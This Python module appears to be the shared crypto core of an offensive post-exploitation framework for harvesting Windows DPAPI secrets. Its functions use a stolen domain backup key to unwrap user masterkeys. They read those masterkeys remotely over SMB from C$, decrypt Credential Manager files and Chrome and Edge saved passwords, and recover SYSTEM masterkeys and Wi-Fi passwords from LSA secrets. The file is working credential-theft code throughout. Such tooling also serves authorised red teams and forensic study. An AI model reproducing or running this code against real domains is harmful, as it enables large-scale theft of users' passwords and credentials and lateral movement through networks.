"""DPAPI crypto shared by the dpapi_* modules (stages 1-4).

Stage 1 (dpapi_backupkey) pulls the domain backup key pair; stages 2-3
spend it here. Third-party imports (impacket, Cryptodome) are
FUNCTION-LOCAL so core stays importable on a bare stdlib interpreter —
the modules gate their own run() on requirements before calling in.

The domain-backup-key path (MS-DPAP; the same one dploot and impacket's
dpapi.py example take):

  1. MasterKeyFile parse: MasterKeyLen, BackupKeyLen, CredHistLen,
     DomainKeyLen — the DomainKey blob holds the masterkey itself,
     RSA-wrapped with the backup key's public half
  2. RSA PKCS1-v1_5 decrypt DomainKey.SecretData (CAPI stores the
     ciphertext LITTLE-endian — reverse first) -> a
     DPAPI_DOMAIN_RSA_MASTER_KEY struct; buffer[:cbMasterKey] IS the
     64-byte masterkey. No PBKDF2/HMAC step on this path — that belongs
     to the user-password MasterKey blob only
  3. DPAPI_BLOB.decrypt(masterkey) opens anything that masterkey
     protects (impacket does the SHA1 + both session-key HMAC variants
     internally and self-verifies the signature)
"""

MASTERKEY_LEN = 64
MASTERKEY_HEX_LEN = 128  # 64 bytes, hexed


def is_guid_name(name):
    """Masterkey/credential files are named by their guid. The same
    dirs also hold BK-<domain> (cached backup-key blob), Preferred,
    desktop.ini and profile litter — only guid-named files are ours."""
    parts = name.split("-")
    if len(parts) != 5:
        return False
    return all(len(p) == n and
               all(c in "0123456789abcdefABCDEF" for c in p)
               for p, n in zip(parts, (8, 4, 4, 4, 12)))


def parse_backup_key_pem(loot_content):
    """RSA key object out of a dpapi-backupkey loot blob (cert + key)."""
    from Cryptodome.PublicKey import RSA
    start = loot_content.index("-----BEGIN RSA PRIVATE KEY-----")
    return RSA.import_key(loot_content[start:].encode())


def find_backup_key(store, label=""):
    """(rsa_key, None) from the newest dpapi-backupkey loot (or the
    newest whose label contains `label`), else (None, reason) with a
    user-presentable reason. Core stays UI-free; the modules print."""
    if store is None:
        return None, ("no evidence store — need a dpapi-backupkey loot "
                      "(run dpapi_backupkey first)")
    loot = store.loot("dpapi-backupkey")
    if label:
        loot = [l for l in loot if label in l["label"]]
    if not loot:
        return None, ("no dpapi-backupkey loot — run "
                      "auxiliary/attack/dpapi_backupkey first")
    try:
        return parse_backup_key_pem(loot[-1]["content"]), None
    except Exception as e:
        return None, f"backup key loot didn't parse - {e}"


def unwrap_domain_key(domain_key_blob, backup_key):
    """64-byte masterkey straight out of a DomainKey blob: RSA
    PKCS1-v1_5 decrypt of SecretData with the domain backup private
    key. None when the key doesn't fit (padding or structure check)."""
    from Cryptodome.Cipher import PKCS1_v1_5
    from impacket import dpapi
    dk = dpapi.DomainKey(domain_key_blob)
    sentinel = object()
    plain = PKCS1_v1_5.new(backup_key).decrypt(
        bytes(dk["SecretData"])[::-1], sentinel)
    if plain is sentinel:
        return None
    try:
        dmk = dpapi.DPAPI_DOMAIN_RSA_MASTER_KEY(plain)
    except Exception:
        return None  # wrong key: garbage that slipped past the padding
    if dmk["cbMasterKey"] != MASTERKEY_LEN or \
            len(dmk["buffer"]) < MASTERKEY_LEN:
        return None
    return bytes(dmk["buffer"][:MASTERKEY_LEN])


def decrypt_masterkey_file(data, backup_key):
    """(guid, masterkey) out of a MasterKeyFile blob:
      (guid, key)   — domain masterkey recovered
      (guid, None)  — DomainKey blob present but the backup key
                      didn't fit (wrong key, or the DC re-keyed)
      (None, None)  — no DomainKey blob at all: a LOCAL account's
                      masterkey, out of the domain-key path's reach"""
    from impacket import dpapi
    mkf = dpapi.MasterKeyFile(data)
    if mkf["DomainKeyLen"] <= 0:
        return None, None
    offset = len(mkf)  # blobs start after the 128-byte header
    # layout: MasterKey, BackupKey, CredHist, DomainKey
    dk_start = offset + mkf["MasterKeyLen"] + mkf["BackupKeyLen"] + \
        mkf["CredHistLen"]
    dk_blob = data[dk_start:dk_start + mkf["DomainKeyLen"]]
    masterkey = unwrap_domain_key(dk_blob, backup_key)
    guid = mkf["Guid"].decode("utf-16-le").rstrip("\x00")
    return guid, masterkey


def decrypt_credential_file(data, masterkeys):
    """(blob_guid, CREDENTIAL_BLOB) out of a CredentialFile blob, given
    a {guid: masterkey} map (guids lowercase, no braces — the masterkey
    FILE name is the guid). (guid, None) when no map key fits."""
    from impacket import dpapi
    from impacket.uuid import bin_to_string
    cred = dpapi.CredentialFile(data)
    blob = dpapi.DPAPI_BLOB(cred["Data"])
    guid = bin_to_string(blob["GuidMasterKey"]).lower()
    key = masterkeys.get(guid)
    if key is None:
        return guid, None
    try:
        plain = blob.decrypt(key)
    except ValueError:
        return guid, None  # wrong key: ciphertext garbage fails unpad
    if plain is None:
        return guid, None
    return guid, dpapi.CREDENTIAL_BLOB(plain)


def credential_fields(blob):
    """(target, username, secret) out of a CREDENTIAL_BLOB — text
    fields are UTF-16-LE; the secret (impacket's Unknown3) is UTF-16-LE
    for cmdkey/domain creds but can be raw bytes for generic ones, in
    which case it comes back hexed."""
    def u16(raw):
        return bytes(raw).decode("utf-16-le", "replace").rstrip("\x00")

    target = u16(blob["Target"])
    username = u16(blob["Username"])
    raw_secret = bytes(blob["Unknown3"])
    try:
        secret = raw_secret.decode("utf-16-le").rstrip("\x00")
    except UnicodeDecodeError:
        secret = raw_secret.hex()  # not really text — show the bytes
    return target, username, secret


# -- browser triage (stage 4) -----------------------------------------------

# browser name -> profile-data dir, relative to a user's profile root
BROWSER_DIRS = {
    "chrome": r"AppData\Local\Google\Chrome\User Data",
    "edge": r"AppData\Local\Microsoft\Edge\User Data",
}


def build_masterkey_map(conn, user_dir, backup_key, err_cb=None):
    """{guid: masterkey} for one profile, read over SMB: every guid file
    under AppData\\Roaming\\Microsoft\\Protect\\<sid>\\ that the backup
    key unwraps. err_cb (e.g. a module's print_debug) gets per-file
    failures; silent otherwise."""
    masterkeys = {}
    protect = f"Users\\{user_dir}\\AppData\\Roaming\\Microsoft\\Protect"
    for sid_dir in _smb_list(conn, f"{protect}\\*"):
        if not sid_dir.startswith("S-"):
            continue
        for entry in _smb_list(conn, f"{protect}\\{sid_dir}\\*"):
            if not is_guid_name(entry):
                continue
            data = _smb_read(conn, f"{protect}\\{sid_dir}\\{entry}")
            if data is None:
                continue
            try:
                guid, mk = decrypt_masterkey_file(data, backup_key)
            except Exception as e:
                if err_cb is not None:
                    err_cb(f"{user_dir}/{entry}: {e}")
                continue
            if mk is not None:
                masterkeys[entry.lower()] = mk
    return masterkeys


def _smb_list(conn, pattern):
    try:
        return [f.get_longname() for f in conn.listPath("C$", pattern)]
    except Exception:
        return []


def _smb_read(conn, path):
    try:
        buf = []
        conn.getFile("C$", path, buf.append)
        return b"".join(buf)
    except Exception:
        return None


def decrypt_browser_key(local_state, masterkeys):
    """32-byte AES key out of a browser's Local State JSON: the
    os_crypt.encrypted_key value is base64 of b"DPAPI" + a DPAPI_BLOB,
    unwrapped with the profile's masterkey (matched by GuidMasterKey).
    None when the key doesn't fit."""
    import base64
    import json
    from impacket import dpapi
    from impacket.uuid import bin_to_string
    try:
        state = json.loads(local_state.decode("utf-8", "replace"))
        raw = base64.b64decode(state["os_crypt"]["encrypted_key"])
    except Exception:
        return None
    if not raw.startswith(b"DPAPI"):
        return None
    blob = dpapi.DPAPI_BLOB(raw[len(b"DPAPI"):])
    guid = bin_to_string(blob["GuidMasterKey"]).lower()
    key = masterkeys.get(guid)
    if key is None:
        return None
    try:
        return blob.decrypt(key)
    except ValueError:
        return None  # wrong key: ciphertext garbage fails unpad


def parse_login_data(data):
    """(origin_url, username, password_blob) rows out of a Login Data
    sqlite (read into memory — no journal/WAL handling needed for a
    closed database)."""
    import sqlite3
    conn = sqlite3.connect(":memory:")
    conn.deserialize(data)
    try:
        return conn.execute(
            "SELECT origin_url, username_value, password_value "
            "FROM logins").fetchall()
    finally:
        conn.close()


def decrypt_browser_login(blob, aes_key):
    """Plaintext out of a v10 password blob: b"v10" + 12-byte nonce +
    AES-256-GCM(ciphertext + 16-byte tag). None for anything else (v20
    app-bound can't be opened off-box by design) or a failed tag."""
    from Cryptodome.Cipher import AES
    if not blob or bytes(blob[:3]) != b"v10":
        return None
    blob = bytes(blob)
    nonce, ct = blob[3:15], blob[15:]
    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    try:
        return cipher.decrypt_and_verify(ct[:-16], ct[-16:])
    except ValueError:
        return None


# -- system-scope triage (stage 5) ------------------------------------------


def decrypt_system_masterkey_file(data, dpapi_system):
    """(guid, masterkey) out of a SYSTEM-context MasterKeyFile blob,
    decrypted with the DPAPI_SYSTEM keys from LSA secrets — the
    password-path PBKDF2/HMAC decryption (no RSA anywhere on this path,
    unlike the domain-user chain). Tries the user key and the machine
    key against both the MasterKey and BackupKey blobs, the way
    impacket's dpapi.py example does. (None, None) when nothing fits."""
    from impacket import dpapi
    mkf = dpapi.MasterKeyFile(data)
    if mkf["MasterKeyLen"] <= 0:
        return None, None
    offset = len(mkf)
    mk = dpapi.MasterKey(data[offset:offset + mkf["MasterKeyLen"]])
    offset += mkf["MasterKeyLen"]
    bkmk = None
    if mkf["BackupKeyLen"] > 0:
        bkmk = dpapi.MasterKey(data[offset:offset + mkf["BackupKeyLen"]])
    guid = mkf["Guid"].decode("utf-16-le").rstrip("\x00")
    candidates = [mk] + ([bkmk] if bkmk is not None else [])
    for key in (dpapi_system.get("UserKey"), dpapi_system.get("MachineKey")):
        if key is None:
            continue
        for blob in candidates:
            masterkey = blob.decrypt(key)
            if masterkey is not None:
                return guid, masterkey
    return guid, None


def parse_dpapi_system(secrets):
    """{MachineKey, UserKey} bytes out of LSASecrets output lines —
    they arrive as 'dpapi_machinekey:0x...' / 'dpapi_userkey:0x...'
    (dploot's parsing, proven against the same dump)."""
    keys = {}
    for secret in secrets:
        for line in secret.splitlines():
            for name, slot in (("dpapi_machinekey", "MachineKey"),
                               ("dpapi_userkey", "UserKey")):
                if line.startswith(name + ":"):
                    keys[slot] = bytes.fromhex(line.split(":", 1)[1][2:])
    return keys


def wifi_passwords(xml_bytes, masterkeys):
    """(ssid, plaintext) out of a Wlansvc profile XML: <keyMaterial>
    is a hexed DPAPI blob under the SYSTEM masterkey, matched by
    GuidMasterKey. Skips open networks (no keyMaterial) and returns
    None for a blob no key fits."""
    import xml.etree.ElementTree as ET
    from impacket import dpapi
    from impacket.uuid import bin_to_string
    try:
        root = ET.fromstring(xml_bytes.decode("utf-8", "replace"))
    except ET.ParseError:
        return None, None
    ns = "{http://www.microsoft.com/networking/WLAN/profile/v1}"
    name_el = root.find(f".//{ns}name")
    ssid = name_el.text if name_el is not None else "?"
    key_el = root.find(f".//{ns}keyMaterial")
    if key_el is None or not key_el.text:
        return ssid, None
    blob = dpapi.DPAPI_BLOB(bytes.fromhex(key_el.text.strip()))
    guid = bin_to_string(blob["GuidMasterKey"]).lower()
    key = masterkeys.get(guid)
    if key is None:
        return ssid, None
    try:
        plain = blob.decrypt(key)
    except ValueError:
        return ssid, None
    if plain is None:
        return ssid, None
    return ssid, plain.decode("utf-8", "replace").rstrip("\x00")
